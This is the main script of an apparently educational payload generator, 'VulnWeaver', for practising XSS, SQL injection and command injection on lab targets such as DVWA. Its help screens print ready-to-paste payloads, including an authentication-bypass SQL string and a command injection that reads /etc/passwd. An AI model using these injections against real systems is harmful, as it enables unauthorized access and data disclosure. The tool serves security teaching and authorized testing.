#!/usr/bin/env python3
"""
VulnWeaver - Payload Generation Framework
Educational Security Tool for Authorized Testing

ETHICAL DISCLAIMER:
This tool is developed strictly for educational, defensive, and authorized
penetration testing environments. Any misuse outside legal authorization is
strictly prohibited and may be illegal.

Aligned with OWASP Code of Ethics:
https://owasp.org/www-project-code-of-ethics/

ITSOLERA (PVT) LTD - Offensive Security Research
Version: 1.0
Date: February 2026
"""

import argparse
import sys
import json
from pathlib import Path

# Import modules
from modules.xss import XSSPayloadGenerator
from modules.sqli import SQLiPayloadGenerator
from modules.cmdi import CMDIPayloadGenerator
from modules.encoder import PayloadEncoder
from modules.export_handler import ExportHandler



class VulnWeaver:
    """
    VulnWeaver - Main framework class orchestrating payload generation
    
    A modular payload template generator for security education and
    authorized penetration testing. Generates non-executing templates
    across XSS, SQLi, and Command Injection attack vectors.
    """
    
    def __init__(self):
        self.encoder = PayloadEncoder()
        self.export_handler = ExportHandler()
        self.version = "1.0.0"
        
    def generate_payloads(self, args):
        """Generate payloads based on command-line arguments"""
        payloads = []
        
        # XSS Module - runs for 'xss' or 'all'
        if args.module in ('xss', 'all'):
            xss_gen = XSSPayloadGenerator()
            payloads.extend(xss_gen.generate_all_contexts())
        
        # SQLi Module - runs for 'sqli' or 'all'
        if args.module in ('sqli', 'all'):
            sqli_gen = SQLiPayloadGenerator(db_type=args.db)
            payloads.extend(sqli_gen.generate_all_types())
        
        # Command Injection Module - runs for 'cmdi' or 'all'
        if args.module in ('cmdi', 'all'):
            cmdi_gen = CMDIPayloadGenerator(os_type=args.os)
            payloads.extend(cmdi_gen.generate_all_patterns())
        
        # Validate and normalize payload dicts
        self._normalize_payloads(payloads)
        
        # Apply encoding if specified
        if args.encode and args.encode != 'none':
            for p in payloads:
                p['encoded_payload'] = self.encoder.encode(p['payload'], args.encode)
                p['encoding_type'] = args.encode
        
        # Apply obfuscation note if specified
        if args.obfuscate:
            note = self._get_obfuscation_notes(args.obfuscate)
            for p in payloads:
                p['obfuscation_notes'] = note
        
        # Display results
        self._display_payloads(payloads)
        
        # Export if requested
        if args.output:
            self.export_handler.export(payloads, args.output, args.format)
            print(f"\n[+] Payloads exported to: {args.output}")
        
        return payloads
    
    def _normalize_payloads(self, payloads):
        """
        Normalize payload dicts to accept multiple naming conventions.
        Supports both built-in module format and custom user formats.
        """
        PAYLOAD_ALIASES = ('payload', 'template')
        TITLE_ALIASES   = ('description', 'title', 'name')
        TYPE_ALIASES    = ('type', 'module', 'category')
        
        for i, p in enumerate(payloads):
            # Resolve the payload string
            for key in PAYLOAD_ALIASES:
                if key in p:
                    p['payload'] = p[key]
                    break
            else:
                raise KeyError(
                    f"Payload dict at index {i} has no recognised payload key "
                    f"(expected one of {PAYLOAD_ALIASES}). "
                    f"Keys present: {list(p.keys())}"
                )
            
            # Resolve description / title
            if 'description' not in p:
                for key in TITLE_ALIASES:
                    if key in p:
                        p['description'] = p[key]
                        break
            
            # Resolve type
            if 'type' not in p:
                for key in TYPE_ALIASES:
                    if key in p:
                        p['type'] = p[key]
                        break
    
    def _display_payloads(self, payloads):
        """Display generated payloads to console with rich formatting"""
        print("\n" + "=" * 80)
        print(" VULNWEAVER - GENERATED PAYLOAD TEMPLATES (EDUCATIONAL USE ONLY)")
        print("=" * 80 + "\n")
        
        for idx, p in enumerate(payloads, 1):
            print(f"[{idx}]\nType: {p.get('type', 'N/A')}")
            
            if 'subtype' in p:
                print(f"Subtype:     {p['subtype']}")
            
            print(f"Context:     {p.get('context', 'N/A')}")
            print(f"Description: {p.get('description', 'N/A')}")
            print(f"Payload:     {p['payload']}")
            
            # Show template/simulation notes if present
            if 'template_note' in p:
                print(f"Usage Note:  {p['template_note']}")
            if 'simulation_note' in p:
                print(f"Lab Note:    {p['simulation_note']}")
            if 'study_note' in p:
                print(f"Study Note:  {p['study_note']}")
            
            # Show encoded version if encoding was applied
            if 'encoded_payload' in p:
                print(f"Encoded ({p['encoding_type']}): {p['encoded_payload']}")
            
            # Show bypass/defensive info
            if 'bypass_explanation' in p:
                print(f"Bypass Logic: {p['bypass_explanation']}")
            
            if 'defensive_notes' in p:
                print(f"Defense: {p['defensive_notes']}")
            
            # Show any additional notes
            if 'note' in p:
                print(f"Note: {p['note']}")
            
            print("-" * 80)
    
    def _get_obfuscation_notes(self, obf_type):
        """Return obfuscation technique explanation"""
        notes = {
            'comment':    'Comment insertion breaks signature-based detection',
            'whitespace': 'Whitespace abuse exploits poor tokenization',
            'mixed':      'Mixed encoding bypasses single-pass decoders',
        }
        return notes.get(obf_type, 'Custom obfuscation applied')


def show_dvwa_xss():
    """Display DVWA XSS test payloads"""
    print("""
╔═══════════════════════════════════════════════════════════════╗
║  XSS PAYLOADS FOR TESTING                                     ║
╚═══════════════════════════════════════════════════════════════╝

⚠️  USE ONLY IN DVWA OR OTHER AUTHORIZED LAB ENVIRONMENTS

PAYLOAD #1 — Basic Script Tag
============================================================
Template:     <script>[PAYLOAD]</script>
Test:    <script>alert(1)</script>
Page:    vulnerabilities/xss_r/
How to Test:  Paste into the "What's your name?" input field
Expected:     Alert box pops up with '1'

PAYLOAD #2 — Image onerror Event
============================================================
Template:     <img src=x onerror=[PAYLOAD]>
Test:    <img src=x onerror=alert(1)>
Page:    vulnerabilities/xss_r/
How to Test:  Paste into the "What's your name?" input field
Expected:     Alert box pops up with '1'

""")


def show_dvwa_sqli():
    """Display DVWA SQLi test payloads"""
    print("""
╔═══════════════════════════════════════════════════════════════╗
║  SQLi PAYLOADS FOR TESTING                                    ║
╚═══════════════════════════════════════════════════════════════╝

⚠️  USE ONLY IN DVWA OR OTHER AUTHORIZED LAB ENVIRONMENTS

PAYLOAD #1 — Authentication Bypass (Always TRUE)
============================================================
Template:     ' OR '1'='1
DVWA Test:    1' OR '1'='1
DVWA Page:    vulnerabilities/sqli/
How to Test:  Enter in "User ID" field, click Submit
Expected:     Returns first user in database (usually admin)

EXPLANATION:
  Original Query: SELECT first_name, surname FROM users WHERE user_id = '[INPUT]'
  Becomes:        SELECT first_name, surname FROM users WHERE user_id = '1' OR '1'='1'
  Result:         WHERE clause is always TRUE — returns all rows

PAYLOAD #2 — UNION SELECT (Version Disclosure)
============================================================
Template:     ' UNION SELECT NULL,NULL
DVWA Test:    1' UNION SELECT NULL,version()#
DVWA Page:    vulnerabilities/sqli/
How to Test:  Enter in "User ID" field, click Submit
Expected:     Displays MySQL version in the surname field

EXPLANATION:
  Original Query: SELECT first_name, surname FROM users WHERE user_id = '[INPUT]'
  Becomes:        SELECT first_name, surname FROM users WHERE user_id = '1' UNION SELECT NULL,version()#'
  Result:         UNION appends MySQL version() output as a second result row
  Note:           # symbol comments out the trailing ' quote

""")


def show_dvwa_cmdi():
    """Display DVWA Command Injection test payloads"""
    print("""
╔═══════════════════════════════════════════════════════════════╗
║  COMMAND INJECTION PAYLOADS FOR TESTING                       ║
╚═══════════════════════════════════════════════════════════════╝

⚠️  USE ONLY IN DVWA OR OTHER AUTHORIZED LAB ENVIRONMENTS

PAYLOAD #1 — Semicolon Separator (Sequential Execution)
============================================================
Template:     [VALID_IP] ; [COMMAND]
DVWA Test:    127.0.0.1 ; whoami
DVWA Page:    vulnerabilities/exec/
How to Test:  Enter in "IP address" field, click Submit
Expected:     Shows ping output, then displays current Linux username (likely www-data)

EXPLANATION:
  Original Command: ping -c 4 [INPUT]
  Becomes:          ping -c 4 127.0.0.1 ; whoami
  Result:           Ping runs first, then whoami executes
  Why it works:     Semicolon chains commands — both run regardless of exit status

PAYLOAD #2 — Pipe Separator (Output Chaining)
============================================================
Template:     [VALID_IP] | [COMMAND]
DVWA Test:    127.0.0.1 | cat /etc/passwd
DVWA Page:    vulnerabilities/exec/
How to Test:  Enter in "IP address" field, click Submit
Expected:     Displays contents of /etc/passwd (system users list)

EXPLANATION:
  Original Command: ping -c 4 [INPUT]
  Becomes:          ping -c 4 127.0.0.1 | cat /etc/passwd
  Result:           Pipe passes ping output to cat (which ignores it), then cat reads /etc/passwd
  Why it works:     Pipe operator chains commands — second always executes

""")


def main():
    """Main entry point with argument parsing"""
    
    banner = r"""
 ██╗   ██╗██╗   ██╗██╗     ███╗   ██╗    ██╗    ██╗███████╗ █████╗ ██╗   ██╗███████╗██████╗
 ██║   ██║██║   ██║██║     ████╗  ██║    ██║    ██║██╔════╝██╔══██╗██║   ██║██╔════╝██╔══██╗
 ██║   ██║██║   ██║██║     ██╔██╗ ██║    ██║ █╗ ██║█████╗  ███████║██║   ██║█████╗  ██████╔╝
 ╚██╗ ██╔╝██║   ██║██║     ██║╚██╗██║    ██║███╗██║██╔══╝  ██╔══██║╚██╗ ██╔╝██╔══╝  ██╔══██╗
  ╚████╔╝ ╚██████╔╝███████╗██║ ╚████║    ╚███╔███╔╝███████╗██║  ██║ ╚████╔╝ ███████╗██║  ██║
   ╚═══╝   ╚═════╝ ╚══════╝╚═╝  ╚═══╝     ╚══╝╚══╝ ╚══════╝╚═╝  ╚═╝  ╚═══╝  ╚══════╝╚═╝  ╚═╝
 """

    print(banner)
    print("Educational Payload Generation Framework - Authorized Testing Only")
    print("=" * 80)
    
    parser = argparse.ArgumentParser(
        description='VulnWeaver - Educational Payload Generation Framework',
        epilog='Example: python payload_gen.py --module xss --encode url --output payloads.json',
        formatter_class=argparse.RawDescriptionHelpFormatter
    )
    
    # Core arguments
    parser.add_argument(
        '--module',
        choices=['xss', 'sqli', 'cmdi', 'all'],
        required=False,
        help='Payload module to use'
    )
    
    parser.add_argument(
        '--encode',
        choices=['url', 'base64', 'hex', 'none'],
        default='none',
        help='Encoding type to apply'
    )
    
    parser.add_argument(
        '--db',
        choices=['mysql', 'postgresql', 'mssql', 'oracle'],
        default='mysql',
        help='Database type for SQLi payloads'
    )
    
    parser.add_argument(
        '--os',
        choices=['linux', 'windows', 'both'],
        default='linux',
        help='Operating system for command injection'
    )
    
    parser.add_argument(
        '--obfuscate',
        choices=['comment', 'whitespace', 'mixed'],
        help='Obfuscation technique to demonstrate'
    )
    
    parser.add_argument(
        '--output',
        help='Output file path for export'
    )
    
    parser.add_argument(
        '--format',
        choices=['json', 'txt', 'csv'],
        default='json',
        help='Export format'
    )
    
    parser.add_argument(
        '--burp',
        action='store_true',
        help='Export in Burp Suite compatible format'
    )
    
    parser.add_argument(
        '--examples',
        action='store_true',
        help='Show usage examples and exit'
    )
    
    parser.add_argument(
        '--version',
        action='store_true',
        help='Show version information and exit'
    )
    
    # DVWA test payload flags
    parser.add_argument(
        '--test-xss',
        action='store_true',
        help='Show 2 ready-to-use XSS payloads for DVWA testing'
    )
    
    parser.add_argument(
        '--test-sqli',
        action='store_true',
        help='Show 2 ready-to-use SQLi payloads for DVWA testing'
    )
    
    parser.add_argument(
        '--test-cmdi',
        action='store_true',
        help='Show 2 ready-to-use command injection payloads for DVWA testing'
    )
    
    args = parser.parse_args()
    
    # Show version if requested
    if args.version:
        print(f"VulnWeaver v1.0.0")
        print(f"ITSOLERA (PVT) LTD - Offensive Security Research")
        print(f"February 2026")
        sys.exit(0)
    
    # Show examples if requested
    if args.examples:
        show_examples()
        sys.exit(0)
    
    # Show DVWA test payloads if requested
    if args.test_xss:
        show_dvwa_xss()
        sys.exit(0)
    
    if args.test_sqli:
        show_dvwa_sqli()
        sys.exit(0)
    
    if args.test_cmdi:
        show_dvwa_cmdi()
        sys.exit(0)
    
    # Module is required if not showing version, examples, or DVWA tests
    if not args.module:
        parser.error('the --module argument is required')
    
    # Initialize framework
    framework = VulnWeaver()
    
    # Generate payloads
    try:
        payloads = framework.generate_payloads(args)
        print(f"\n[✓] VulnWeaver generated {len(payloads)} payload templates successfully")
        print("\n[!] REMINDER: These are educational templates for authorized testing only!")
        
    except KeyError as e:
        print(f"\n[!] Error: {e}", file=sys.stderr)
        sys.exit(1)
    except Exception as e:
        print(f"\n[!] Unexpected error: {e}", file=sys.stderr)
        import traceback
        traceback.print_exc()
        sys.exit(1)


def show_examples():
    """Display usage examples"""
    print("""
╔═══════════════════════════════════════════════════════════════════════════╗
║  VULNWEAVER - USAGE EXAMPLES                                              ║
╚═══════════════════════════════════════════════════════════════════════════╝

BASIC GENERATION:
═════════════════

1. Generate XSS payloads (all contexts):
   python payload_gen.py --module xss

2. Generate SQL injection payloads for MySQL:
   python payload_gen.py --module sqli --db mysql

3. Generate command injection patterns for Linux:
   python payload_gen.py --module cmdi --os linux

4. Generate all payload types:
   python payload_gen.py --module all


DVWA QUICK TESTING:
═══════════════════

5. Show DVWA XSS test payloads (2 ready-to-paste):
   python payload_gen.py --dvwa-xss

6. Show DVWA SQLi test payloads (2 ready-to-paste):
   python payload_gen.py --dvwa-sqli

7. Show DVWA CMDi test payloads (2 ready-to-paste):
   python payload_gen.py --dvwa-cmdi


WITH ENCODING:
══════════════

8. Generate XSS payloads with URL encoding:
   python payload_gen.py --module xss --encode url

9. Generate SQLi payloads with Base64 encoding:
   python payload_gen.py --module sqli --encode base64 --db postgresql


EXPORT OPTIONS:
═══════════════

10. Export to JSON file:
    python payload_gen.py --module xss --output xss_payloads.json

11. Export to text catalog:
    python payload_gen.py --module sqli --output sqli.txt --format txt

12. Export to CSV for analysis:
    python payload_gen.py --module all --output all.csv --format csv

13. Export for Burp Suite Intruder:
    python payload_gen.py --module xss --burp --output burp_xss.txt


ADVANCED USAGE:
═══════════════

14. Generate Windows command injection patterns:
    python payload_gen.py --module cmdi --os windows

15. Generate cross-platform command injection:
    python payload_gen.py --module cmdi --os both

16. Generate MSSQL-specific SQLi payloads:
    python payload_gen.py --module sqli --db mssql

17. Generate with obfuscation notes:
    python payload_gen.py --module xss --obfuscate comment

18. Full pipeline example:
    python payload_gen.py --module all --encode url --output full_suite.json


OTHER OPTIONS:
══════════════

--version     Show VulnWeaver version
--examples    Show this help (you're reading it now!)


ETHICAL REMINDER:
═════════════════
✓ Always obtain written authorization before testing
✓ Use only in lab environments (DVWA, bWAPP, WebGoat, etc.)
✓ Never test on production systems without proper approval
✓ Follow OWASP Code of Ethics at all times

Unauthorized access is illegal and unethical.
When in doubt, don't test — ask for permission first.

═══════════════════════════════════════════════════════════════════════════
For more information, see README.md and ETHICAL_GUIDELINES.md
""")


if __name__ == '__main__':
    main()